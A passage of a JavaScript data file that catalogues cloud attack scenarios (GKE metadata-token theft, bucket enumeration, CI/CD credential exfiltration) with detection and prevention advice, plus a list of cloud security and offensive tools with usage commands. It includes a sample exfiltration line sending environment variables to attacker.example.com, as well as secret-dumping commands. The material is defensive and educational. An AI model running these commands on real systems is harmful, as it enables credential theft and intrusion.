    prevention: 'Avoid creating service account keys wherever possible; use Workload Identity Federation instead. If keys are necessary, rotate them every 90 days. Use organization policies to restrict service account key creation (constraints/iam.disableServiceAccountKeyCreation). Implement VPC Service Controls to limit data exfiltration. Apply least-privilege IAM roles to all service accounts. Scan repositories for leaked credentials using tools like truffleHog or gitleaks.'
  },
  {
    id: 'ATK-010',
    name: 'GCP Metadata Server to Kubernetes Secrets and Lateral Movement',
    cloud: 'gcp',
    description: 'Exploiting a compromised GKE pod without Workload Identity to access the node metadata server, obtain the node service account credentials, then access Kubernetes secrets and move laterally across the cluster.',
    steps: [
      '1. Attacker compromises a GKE pod through a web vulnerability or supply chain attack',
      '2. Attacker accesses the GCP metadata server from within the pod (if IMDSv1 and default networking): curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
      '3. Attacker obtains the node service account OAuth2 token, which typically has compute.viewer, monitoring.viewer, logging.write, and storage.objectViewer permissions',
      '4. Attacker uses the token to list GKE clusters and get credentials: gcloud container clusters get-credentials <cluster> --zone <zone>',
      '5. Attacker retrieves the Kubernetes service account token mounted in the pod: cat /var/run/secrets/kubernetes.io/serviceaccount/token',
      '6. Attacker queries the Kubernetes API for secrets: kubectl get secrets --all-namespaces',
      '7. Attacker retrieves secret values containing database credentials, API keys, and TLS certificates: kubectl get secret <name> -n <ns> -o jsonpath="{.data}" | base64 -d',
      '8. Attacker uses discovered credentials to access databases, APIs, and other services, then moves laterally to additional pods and namespaces'
    ],
    impact: 'Access to all Kubernetes secrets across namespaces (depending on RBAC configuration), lateral movement within the cluster, and potential access to GCP resources via node service account. Data exfiltration from databases and services whose credentials are stored as Kubernetes secrets.',
    detection: 'Enable GKE workload audit logging to detect unusual Kubernetes API calls. Monitor for metadata server access from pod network namespaces. Use Falco or similar runtime security tools to detect suspicious process execution in containers. Alert on bulk secret listing operations in Kubernetes audit logs. Enable Security Command Center Container Threat Detection.',
    prevention: 'Enable Workload Identity on all GKE clusters to replace node-level metadata access with pod-level identity. Set metadata concealment on node pools (--workload-metadata=GKE_METADATA). Implement Kubernetes RBAC to restrict secret access per namespace. Use external secret managers (GCP Secret Manager) instead of Kubernetes secrets where possible. Apply network policies to restrict pod-to-metadata-service communication. Enable Binary Authorization to prevent unauthorized container images.'
  },
  {
    id: 'ATK-011',
    name: 'Cloud Storage Bucket Enumeration and Sensitive Data Exposure',
    cloud: 'multi',
    description: 'Systematic enumeration of cloud storage buckets across providers using predictable naming patterns to discover and access publicly exposed sensitive data.',
    steps: [
      '1. Attacker generates bucket name wordlists based on target organization: <company>, <company>-dev, <company>-staging, <company>-prod, <company>-backup, <company>-data, <company>-logs',
      '2. For AWS S3: attacker checks each name: aws s3 ls s3://<name> --no-sign-request (or curl https://<name>.s3.amazonaws.com)',
      '3. For GCP: gsutil ls gs://<name> or curl https://storage.googleapis.com/<name>',
      '4. For Azure: curl https://<name>.blob.core.windows.net/<container>?restype=container&comp=list',
      '5. Attacker identifies publicly readable buckets and downloads contents',
      '6. Attacker searches downloaded files for: credentials, PII, financial data, source code, database exports, log files with sensitive information',
      '7. Attacker may find additional internal bucket names or resource identifiers in downloaded files, expanding the attack surface',
      '8. If write access is also public, attacker may upload malicious content (web shells, backdoored scripts) that the organization inadvertently executes'
    ],
    impact: 'Exposure of sensitive organizational data including customer PII, financial records, intellectual property, credentials, and internal communications. Write access to buckets can enable supply chain attacks through malicious content injection.',
    detection: 'Enable storage access logging on all buckets to track anonymous access attempts. Use cloud-native tools (AWS Macie, GCP DLP API) to classify sensitive data in storage. Monitor for high-volume anonymous list/get operations. Set up alerts for public access changes on storage resources. Use external attack surface monitoring tools to detect publicly exposed storage.',
    prevention: 'Enable public access prevention at the account/organization level (AWS S3 Block Public Access, GCP organization policy, Azure storage account settings). Use non-predictable bucket names that include random identifiers. Implement data classification and DLP scanning on all storage buckets. Use VPC/VNet service endpoints or private endpoints for storage access. Regularly audit bucket permissions and ACLs with automated tools.'
  },
  {
    id: 'ATK-012',
    name: 'CI/CD Pipeline Compromise to Cloud Credential Theft',
    cloud: 'multi',
    description: 'Compromising a CI/CD pipeline (GitHub Actions, GitLab CI, Jenkins, CircleCI) to steal cloud credentials stored as pipeline secrets or to abuse OIDC federation to obtain temporary cloud credentials.',
    steps: [
      '1. Attacker gains access to the source code repository through a compromised developer account, leaked token, or accepted malicious pull request',
      '2. Attacker modifies the CI/CD pipeline configuration (e.g., .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile)',
      '3. Attacker adds steps to exfiltrate environment variables containing cloud credentials: env | base64 | curl -X POST -d @- https://attacker.example.com/collect',
      '4. Alternatively, attacker modifies build scripts to inject malicious code that runs during the build process with access to pipeline secrets',
      '5. If the pipeline uses OIDC federation (e.g., GitHub Actions OIDC with AWS), attacker modifies the workflow to obtain credentials and use them for unauthorized access',
      '6. Attacker receives cloud access keys, service account credentials, or temporary tokens from the exfiltrated data',
      '7. Attacker uses stolen credentials to access cloud infrastructure, deploy backdoors, or exfiltrate data',
      '8. Attacker may inject persistent backdoors into application code that survives credential rotation'
    ],
    impact: 'Theft of cloud deployment credentials enabling access to production infrastructure. Supply chain compromise through modified application code deployed via the pipeline. Persistent access through injected backdoors in deployed applications.',
    detection: 'Monitor CI/CD pipeline configuration changes for unexpected modifications. Alert on new pipeline steps that make external network requests. Use branch protection rules requiring reviews for workflow changes. Monitor cloud API usage from CI/CD IP ranges for unusual patterns. Implement pipeline integrity verification (signed commits, protected branches).',
    prevention: 'Use OIDC federation instead of long-lived credentials in pipelines. Require pull request reviews for all CI/CD configuration changes. Implement branch protection rules on main/production branches. Use short-lived, narrowly scoped credentials for deployments. Restrict pipeline access to specific cloud resources using IAM conditions (e.g., aws:SourceIp). Pin actions and dependencies to specific versions/hashes. Use CODEOWNERS files to require security team review for pipeline changes.'
  }
];

const CLOUD_TOOLS = [
  {
    name: 'ScoutSuite',
    cloud: 'multi',
    category: 'Audit',
    description: 'Multi-cloud security auditing tool that collects configuration data from cloud providers and generates comprehensive HTML reports highlighting security risks. Supports AWS, Azure, GCP, Alibaba Cloud, and Oracle Cloud.',
    repository: 'https://github.com/nccgroup/ScoutSuite',
    install: 'pip install scoutsuite',
    usage: 'scout aws --profile <profile>\nscout azure --cli\nscout gcp --user-account',
    features: [
      'Multi-cloud support (AWS, Azure, GCP, Alibaba, Oracle)',
      'HTML report generation with risk scoring',
      'Rule-based analysis with customizable rulesets',
      'Service-by-service breakdown of findings',
      'Exportable JSON results for integration with other tools',
      'No agents required - uses API-based collection'
    ]
  },
  {
    name: 'Prowler',
    cloud: 'aws',
    category: 'Audit',
    description: 'AWS security assessment and compliance tool that performs over 300 checks covering CIS Benchmarks, PCI-DSS, HIPAA, GDPR, SOC2, and AWS best practices. Generates reports in multiple formats.',
    repository: 'https://github.com/prowler-cloud/prowler',
    install: 'pip install prowler\n# Or via Docker:\ndocker pull toniblyx/prowler',
    usage: 'prowler aws\nprowler aws --compliance cis_1.5_aws\nprowler aws --service s3 iam\nprowler aws -M csv json html',
    features: [
      'Over 300 security checks mapped to compliance frameworks',
      'CIS AWS Foundations Benchmark v1.4 and v1.5 coverage',
      'PCI-DSS, HIPAA, GDPR, SOC2, NIST 800-53 compliance mapping',
      'Multiple output formats: CSV, JSON, HTML, ASFF (Security Hub)',
      'Integration with AWS Security Hub for centralized findings',
      'Support for multi-account scanning via AWS Organizations',
      'Custom check development framework'
    ]
  },
  {
    name: 'CloudSploit',
    cloud: 'multi',
    category: 'Audit',
    description: 'Open-source cloud security configuration scanner that detects hundreds of threats across AWS, Azure, GCP, and Oracle Cloud. Provides compliance mapping and remediation guidance.',
    repository: 'https://github.com/aquasecurity/cloudsploit',
    install: 'git clone https://github.com/aquasecurity/cloudsploit.git\ncd cloudsploit\nnpm install',
    usage: 'node index.js --cloud aws --config config.js\nnode index.js --cloud azure\nnode index.js --cloud gcp --compliance cis',
    features: [
      'Multi-cloud support (AWS, Azure, GCP, Oracle)',
      'Plugin-based architecture for easy extensibility',
      'CIS Benchmark compliance scanning',
      'JSON and CSV output for CI/CD integration',
      'Console output with color-coded severity levels',
      'Continuous monitoring mode for real-time detection'
    ]
  },
  {
    name: 'Pacu',
    cloud: 'aws',
    category: 'Offensive',
    description: 'AWS exploitation framework designed for offensive security testing. Provides modules for privilege escalation, credential harvesting, data exfiltration, and persistence in AWS environments.',
    repository: 'https://github.com/RhinoSecurityLabs/pacu',
    install: 'git clone https://github.com/RhinoSecurityLabs/pacu.git\ncd pacu\npython3 -m pip install -r requirements.txt\npython3 pacu.py',
    usage: 'python3 pacu.py\n# Inside Pacu:\nset_keys\nrun iam__enum_permissions\nrun iam__privesc_scan\nrun s3__download_bucket\nrun lambda__enum',
    features: [
      'Modular exploitation framework with 30+ attack modules',
      'IAM privilege escalation scanning and exploitation',
      'Credential harvesting from EC2 metadata, Lambda, and more',
      'S3 bucket enumeration and data exfiltration',
      'Lambda function backdooring and persistence',
      'Session tracking and credential management',
      'Logging of all actions for reporting'
    ]
  },
  {
    name: 'CloudMapper',
    cloud: 'aws',
    category: 'Inventory',
    description: 'Generates network topology diagrams of AWS environments and identifies public exposure of resources. Helps visualize VPC architecture, security groups, and network connectivity.',
    repository: 'https://github.com/duo-labs/cloudmapper',
    install: 'git clone https://github.com/duo-labs/cloudmapper.git\ncd cloudmapper\npip install -r requirements.txt\npython setup.py install',
    usage: 'python cloudmapper.py collect --account <account-name>\npython cloudmapper.py prepare --account <account-name>\npython cloudmapper.py webserver\npython cloudmapper.py report --account <account-name>\npython cloudmapper.py find_admins --account <account-name>',
    features: [
      'Visual network topology diagrams of AWS environments',
      'Public exposure analysis for all resource types',
      'Interactive web-based visualization',
      'Admin identification across IAM principals',
      'Audit report generation for compliance',
      'Resource inventory across all regions',
      'Security group analysis and visualization'
    ]
  },
  {
    name: 'Cartography',
    cloud: 'multi',
    category: 'Inventory',
    description: 'Graph-based infrastructure analysis tool from Lyft that consolidates cloud infrastructure assets and relationships into a Neo4j graph database. Enables complex queries for security analysis and attack path discovery.',
    repository: 'https://github.com/lyft/cartography',
    install: 'pip install cartography\n# Requires Neo4j:\ndocker run -p 7474:7474 -p 7687:7687 neo4j',
    usage: 'cartography --neo4j-uri bolt://localhost:7687 --neo4j-user neo4j --neo4j-password <password>\n# Query in Neo4j:\nMATCH (n:S3Bucket) WHERE n.anonymous_access = true RETURN n\nMATCH (a:AWSAccount)-[:RESOURCE]->(i:EC2Instance)-[:MEMBER_OF_EC2_SECURITY_GROUP]->(sg) WHERE sg.ingress_cidr = "0.0.0.0/0" RETURN i, sg',
    features: [
      'Graph-based relationship modeling of cloud infrastructure',
      'Neo4j-powered queries for complex security analysis',
      'AWS, GCP, Azure, GitHub, Okta, and more data sources',
      'Attack path discovery through relationship traversal',
      'Asset inventory and dependency mapping',
      'Drift detection across scan snapshots',
      'Extensible data model for custom integrations'
    ]
  },
  {
    name: 'Steampipe',
    cloud: 'multi',
    category: 'Audit',
    description: 'Query cloud infrastructure using SQL. Provides real-time queries against cloud APIs using a PostgreSQL-compatible interface. Includes compliance frameworks as code (Steampipe Mod).',
    repository: 'https://github.com/turbot/steampipe',
    install: 'brew install turbot/tap/steampipe\n# Or on Linux:\nsudo /bin/sh -c "$(curl -fsSL https://steampipe.io/install/steampipe.sh)"\nsteampipe plugin install aws azure gcp',
    usage: 'steampipe query "SELECT name, region, versioning FROM aws_s3_bucket WHERE versioning != \'Enabled\'"\nsteampipe query "SELECT title, public_access FROM azure_storage_account WHERE public_access != \'None\'"\nsteampipe check all --mod-location ~/steampipe-mod-aws-compliance',
    features: [
      'SQL interface for querying 140+ cloud services',
      'Real-time queries against live cloud APIs',
      'Pre-built compliance mods for CIS, SOC2, PCI-DSS, HIPAA',
      'Supports AWS, Azure, GCP, Kubernetes, and 100+ plugins',
      'Dashboard visualization of query results',
      'Integration with Grafana, Metabase, and BI tools',
      'Snapshot and diff capabilities for drift detection'
    ]
  },
  {
    name: 'Cloudfox',
    cloud: 'aws',
    category: 'Offensive',
    description: 'Automating situational awareness for cloud penetration testing. Helps identify exploitable attack paths in AWS environments by enumerating permissions, roles, and resource configurations.',
    repository: 'https://github.com/BishopFox/cloudfox',
    install: 'go install github.com/BishopFox/cloudfox@latest\n# Or download from releases:\nhttps://github.com/BishopFox/cloudfox/releases',
    usage: 'cloudfox aws --profile <profile> all-checks\ncloudfox aws permissions\ncloudfox aws endpoints\ncloudfox aws env-vars\ncloudfox aws iam-simulator\ncloudfox aws instances',
    features: [
      'Automated AWS enumeration for penetration testers',
      'IAM permissions analysis and privilege escalation path finding',
      'Service endpoint discovery (Lambda URLs, API Gateway, ECS services)',
      'Environment variable enumeration for secret discovery',
      'Instance metadata and user-data analysis',
      'Cross-account role trust analysis',
      'Output in table, CSV, and loot file formats'
    ]
  },
  {
    name: 'enumerate-iam',
    cloud: 'aws',
    category: 'Offensive',
    description: 'Brute-forces AWS IAM permissions for a given set of credentials by attempting all possible API calls and recording which succeed. Useful for understanding the exact permissions of compromised credentials.',
    repository: 'https://github.com/andresriancho/enumerate-iam',
    install: 'git clone https://github.com/andresriancho/enumerate-iam.git\ncd enumerate-iam\npip install -r requirements.txt',
    usage: 'python enumerate-iam.py --access-key <AKIA...> --secret-key <secret> --session-token <token>\npython enumerate-iam.py --access-key <AKIA...> --secret-key <secret> --region us-east-1',
    features: [
      'Brute-force enumeration of all IAM permissions',
      'Works with access keys, secret keys, and session tokens',
      'Covers hundreds of AWS API actions across all services',
      'No CloudTrail alerts for most enumeration calls (AccessDenied responses)',
      'Output shows exact actions the credentials can perform',
      'Region-specific enumeration support'
    ]
  },
  {
    name: 'WeirdAAL',
    cloud: 'aws',
    category: 'Offensive',
    description: 'AWS Attack Library - a collection of offensive modules for AWS security testing. Provides reconnaissance, enumeration, and exploitation capabilities organized by AWS service.',
    repository: 'https://github.com/carnal0wnage/weirdAAL',
    install: 'git clone https://github.com/carnal0wnage/weirdAAL.git\ncd weirdAAL\npip install -r requirements.txt\ncp env.sample .env\n# Edit .env with AWS credentials',
    usage: 'python3 weirdAAL.py -m recon_all -t <target>\npython3 weirdAAL.py -m s3_list_buckets -t <target>\npython3 weirdAAL.py -m iam_list_users -t <target>\npython3 weirdAAL.py -m lambda_list_functions -t <target>',
    features: [
      'Service-organized offensive modules',
      'Reconnaissance across all major AWS services',
      'S3 bucket operations (list, download, upload)',
      'IAM user, role, and policy enumeration',
      'Lambda function listing and code retrieval',
      'EC2 instance discovery and metadata access',
      'STS credential testing and session management'
    ]
  },
  {
    name: 'ROADtools',
    cloud: 'azure',
    category: 'Offensive',
    description: 'Azure AD exploration framework for Red Team assessments. Collects and analyzes Azure AD data including users, groups, applications, service principals, and role assignments via the Microsoft Graph and Azure AD Graph APIs.',
    repository: 'https://github.com/dirkjanm/ROADtools',
    install: 'pip install roadrecon roadlib\n# Or from source:\ngit clone https://github.com/dirkjanm/ROADtools.git\ncd ROADtools\npip install -e roadlib/\npip install -e roadrecon/',
    usage: 'roadrecon auth -u <user> -p <password>\nroadrecon auth --as-app -c <client-id> -s <client-secret>\nroadrecon gather\nroadrecon gui\nroadrecon plugin policies',
    features: [
      'Azure AD data collection via Graph API',
      'Interactive web-based GUI for data exploration',
      'User, group, and application enumeration',
      'Service principal and OAuth permission analysis',
      'Conditional Access policy extraction and analysis',
      'Device and Intune configuration enumeration',
      'Plugin system for extended functionality',
      'Token-based authentication support'
    ]
  },
  {
    name: 'AzureHound',
    cloud: 'azure',
    category: 'Offensive',
    description: 'Azure data collector for BloodHound, the Active Directory attack path analysis tool. Collects Azure AD and Azure Resource Manager data to identify privilege escalation paths and attack routes in Azure environments.',
    repository: 'https://github.com/BloodHoundAD/AzureHound',
    install: 'go install github.com/BloodHoundAD/AzureHound/v2@latest\n# Or download binary from releases:\nhttps://github.com/BloodHoundAD/AzureHound/releases',
    usage: 'azurehound -u <user>@<domain> -p <password> list --tenant <tenant-id> -o output.json\nazurehound -j <jwt-token> list --tenant <tenant-id>\nazurehound list -u <user> -p <pass> --tenant <tenant> -o azure.json',
    features: [
      'Azure AD and Azure RM data collection for BloodHound',
      'Attack path visualization in BloodHound CE',
      'User, group, role, and application relationship mapping',
      'Privilege escalation path discovery',
      'Cross-tenant trust relationship analysis',
      'Service principal abuse path identification',
      'Subscription and resource group permission analysis',
      'Integration with BloodHound Community Edition'
    ]
  },
  {
    name: 'Stormspotter',
    cloud: 'azure',
    category: 'Inventory',
    description: 'Azure Red Team tool for graphing Azure and Azure AD objects and their relationships. Creates a graph database of the environment for attack path analysis and visualization.',
    repository: 'https://github.com/Azure/Stormspotter',
    install: 'git clone https://github.com/Azure/Stormspotter.git\ncd Stormspotter\ndocker-compose up\n# Or:\npip install stormspotter',
    usage: 'stormspotter login\nstormspotter collect --tenant <tenant-id>\nstormspotter gui\n# Access web interface at http://localhost:9091',
    features: [
      'Graph-based visualization of Azure environments',
      'Azure AD object relationship mapping',
      'RBAC and IAM analysis across subscriptions',
      'Docker-based deployment with web UI',
      'Neo4j backend for complex graph queries',
      'Visual attack path identification',
      'Export capabilities for reporting'
    ]
  },
  {
    name: 'GCPBucketBrute',
    cloud: 'gcp',
    category: 'Offensive',
    description: 'Enumerates Google Cloud Storage buckets to determine their existence, access permissions, and whether they contain sensitive data. Tests for both unauthenticated and authenticated access.',
    repository: 'https://github.com/RhinoSecurityLabs/GCPBucketBrute',
    install: 'git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git\ncd GCPBucketBrute\npip install -r requirements.txt',
    usage: 'python3 gcpbucketbrute.py -k <keyword>\npython3 gcpbucketbrute.py -k <keyword> -s <service-account-key.json>\npython3 gcpbucketbrute.py -k <keyword> -w wordlist.txt',
    features: [
      'GCP bucket name enumeration and discovery',
      'Unauthenticated and authenticated access testing',
      'Custom wordlist support for targeted enumeration',
      'Permission checking (read, write, list) on discovered buckets',
      'Service account and user credential support',
      'Multithreaded scanning for speed',
      'Clear output of accessible buckets and their permissions'
    ]
  },
  {
    name: 'CloudBrute',
    cloud: 'multi',
    category: 'Offensive',
    description: 'Cloud infrastructure enumeration tool that discovers company-owned assets across AWS, Azure, GCP, and DigitalOcean. Identifies storage buckets, databases, virtual machines, and other cloud resources.',
    repository: 'https://github.com/0xsha/CloudBrute',
    install: 'go install github.com/0xsha/CloudBrute@latest\n# Or download from releases:\nhttps://github.com/0xsha/CloudBrute/releases',
    usage: 'CloudBrute -d <domain> -k <keyword> -m storage -t 80 -T 10\nCloudBrute -d example.com -k company -m storage -p aws,gcp,azure\nCloudBrute -d example.com -w wordlist.txt',
    features: [
      'Multi-cloud asset enumeration (AWS, Azure, GCP, DigitalOcean)',
      'Storage bucket discovery across providers',
      'Application and database endpoint enumeration',
      'Custom wordlist and mutation support',
      'Provider-specific enumeration modes',
      'Concurrent scanning with configurable thread count',
      'Clean JSON output for integration with other tools'
    ]
  },
  {
    name: 'Checkov',
    cloud: 'multi',
    category: 'IaC',
    description: 'Static analysis tool for infrastructure-as-code that scans Terraform, CloudFormation, Kubernetes, Helm, ARM templates, and Serverless Framework for security misconfigurations before deployment.',
    repository: 'https://github.com/bridgecrewio/checkov',
    install: 'pip install checkov\n# Or via Docker:\ndocker pull bridgecrew/checkov',
    usage: 'checkov -d <terraform-directory>\ncheckov -f <cloudformation-template.yaml>\ncheckov --framework terraform --check CKV_AWS_18\ncheckov -d . --output json --compact\ncheckov -d . --framework kubernetes',
    features: [
      'Over 1000 built-in security policies',
      'Terraform, CloudFormation, Kubernetes, Helm, ARM, Dockerfile scanning',
      'CIS Benchmark and custom policy support',
      'Graph-based analysis for cross-resource policy checking',
      'CI/CD integration (GitHub Actions, GitLab CI, Jenkins)',
      'Auto-fix suggestions for common misconfigurations',
      'Secrets scanning in IaC files',
      'SARIF output for IDE integration'
    ]
  },
  {
    name: 'tfsec',
    cloud: 'multi',
    category: 'IaC',
    description: 'Static analysis security scanner for Terraform code. Detects potential security issues and misconfigurations in Terraform HCL files before infrastructure is provisioned.',
    repository: 'https://github.com/aquasecurity/tfsec',
    install: 'brew install tfsec\n# Or via Go:\ngo install github.com/aquasecurity/tfsec/cmd/tfsec@latest\n# Or via Docker:\ndocker pull aquasec/tfsec',
    usage: 'tfsec .\ntfsec . --format json\ntfsec . --minimum-severity HIGH\ntfsec . --exclude aws-s3-enable-versioning\ntfsec . --run-statistics',
    features: [
      'Terraform-specific static analysis',
      'Module and variable resolution',
      'Severity-based filtering (CRITICAL, HIGH, MEDIUM, LOW)',
      'JSON, CSV, SARIF, and JUnit XML output formats',
      'Custom rule support via YAML definitions',
      'IDE integration (VS Code extension)',
      'Pre-commit hook support',
      'Inline ignore comments for false positives'
    ]
  },
  {
    name: 'kube-bench',
    cloud: 'multi',
    category: 'Audit',
    description: 'Checks Kubernetes cluster configurations against the CIS Kubernetes Benchmark. Evaluates master node, worker node, control plane, and policy configurations for security compliance.',
    repository: 'https://github.com/aquasecurity/kube-bench',
    install: 'go install github.com/aquasecurity/kube-bench@latest\n# Or via Docker:\ndocker run --pid=host -v /etc:/etc:ro -v /var:/var:ro aquasec/kube-bench run\n# Or as a Kubernetes Job:\nkubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml',
    usage: 'kube-bench run\nkube-bench run --targets master\nkube-bench run --targets node\nkube-bench run --benchmark cis-1.8\nkube-bench run --json | jq',
    features: [
      'CIS Kubernetes Benchmark v1.6, v1.7, v1.8 support',
      'EKS, GKE, AKS, and self-managed cluster support',
      'Master and worker node configuration checks',
      'Control plane component analysis',
      'Pod security policy and network policy verification',
      'JSON output for automated processing',
      'Customizable check definitions via YAML',
      'Container and binary deployment options'
    ]
  }
];
